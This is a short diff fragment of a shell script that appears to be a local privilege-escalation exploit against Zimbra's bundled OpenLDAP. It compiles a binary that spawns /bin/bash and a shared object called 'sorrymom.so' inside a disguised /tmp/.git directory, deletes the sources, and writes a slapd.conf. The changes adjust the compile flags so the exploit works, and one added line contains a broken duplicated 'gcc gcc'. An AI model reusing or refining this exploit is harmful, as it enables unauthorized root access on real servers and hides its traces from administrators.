@@ -26,9 +26,10 @@ int main(void){
     execvp("/bin/bash", argument_list);
 }
 EOF
-gcc -o /tmp/.git/init /tmp/.git/init.c
+export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
+gcc -static -o /tmp/.git/init /tmp/.git/init.c
+gcc gcc -fPIC -shared -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
 rm -rf /tmp/.git/init.c
-gcc -fPIC -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
 rm -rf /tmp/.git/sorrymom.c
 cat << EOF > /tmp/.git/slapd.conf
 include		/opt/zimbra/common/etc/openldap/schema/core.schema
